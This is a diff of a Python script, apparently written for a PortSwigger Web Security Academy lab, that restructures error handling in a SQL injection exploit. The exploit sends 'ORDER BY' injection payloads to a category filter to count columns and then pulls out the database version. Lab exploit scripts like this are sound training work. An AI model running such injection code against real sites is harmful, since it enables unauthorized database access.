@@ -6,26 +6,14 @@ from requests.adapters import HTTPAdapter, Retry
 
 
 def determine_columns(lab_url, session):
-    try:
-        num_of_columns = 0
-        for i in range(1, 20):
-            response = session.get(f"{lab_url}/filter?category=x' ORDER BY {i}--", timeout=10)
-            if response.status_code == 500:
-                num_of_columns = i - 1
-                break
+    num_of_columns = 0
+    for i in range(1, 20):
+        response = session.get(f"{lab_url}/filter?category=x' ORDER BY {i}--", timeout=10)
+        if response.status_code == 500:
+            num_of_columns = i - 1
+            break
+    if num_of_columns != 0:
         return num_of_columns
-
-    except requests.exceptions.Timeout:
-        print("(-) Request timed out.")
-        sys.exit(1)
-
-    except requests.exceptions.MissingSchema:
-        print("(-) Please enter a valid URL.")
-        sys.exit(1)
-
-    except requests.exceptions.ConnectionError:
-        print("(-) Unable to connect to host. Please check your URL and try again.")
-        sys.exit(1)
 
 
 def extract_text(response):
@@ -36,7 +24,6 @@ def extract_text(response):
     formatted_version_string = ""
     for line in version_string.split("\n\n"):
         formatted_version_string += "\n" + line.strip()
-
     return formatted_version_string
 
 
@@ -57,18 +44,31 @@ def main():
         print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
         sys.exit(1)
 
+    try:
+        lab_url = sys.argv[1].rstrip("/")
+        session = requests.Session()
+        session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
 
-    lab_url = sys.argv[1].rstrip("/")
-    session = requests.Session()
-    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
+        num_of_columns = determine_columns(lab_url, session)
+        if not num_of_columns:
+            print("(-) Something went wrong. Please check your URL and try again.")
+            sys.exit(1)
 
-    print("(+) Retrieving database version information...")
-    num_of_columns = determine_columns(lab_url, session)
-    db_version = get_db_version(lab_url, session, num_of_columns)
-    if db_version:
-        print(f"(+) Database Version Information: {db_version}")
-    else:
-        print("(-) Unable to retrieve database version information.")
+        print("(+) Retrieving database version information...")
+        db_version = get_db_version(lab_url, session, num_of_columns)
+        if db_version:
+            print(f"(+) Database Version Information: {db_version}")
+        else:
+            print("(-) Unable to retrieve database version information.")
+
+    except requests.exceptions.Timeout:
+        print("(-) Request timed out.")
+
+    except requests.exceptions.MissingSchema:
+        print("(-) Please enter a valid URL.")
+
+    except requests.exceptions.ConnectionError:
+        print("(-) Unable to connect to host. Please check your URL and try again.")
 
 
 if __name__ == "__main__":
